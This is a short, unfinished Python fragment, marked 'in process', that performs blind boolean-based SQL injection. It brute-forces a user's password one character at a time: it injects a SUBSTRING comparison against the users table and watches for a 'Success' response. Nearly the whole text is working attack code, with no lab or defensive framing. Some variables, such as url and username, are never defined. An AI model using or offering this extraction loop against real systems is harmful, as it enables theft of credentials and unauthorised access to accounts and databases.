"""
for i in range(1, 21): 
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username = '{username}') = '{char}'--"
        response = requests.get(url, params={"input": payload})
        
        if "Success" in response.text:  
            password += char
            print(f"[+] Found character {i}: {char}")
            break

print(f"Password: {password}")
"""
# in process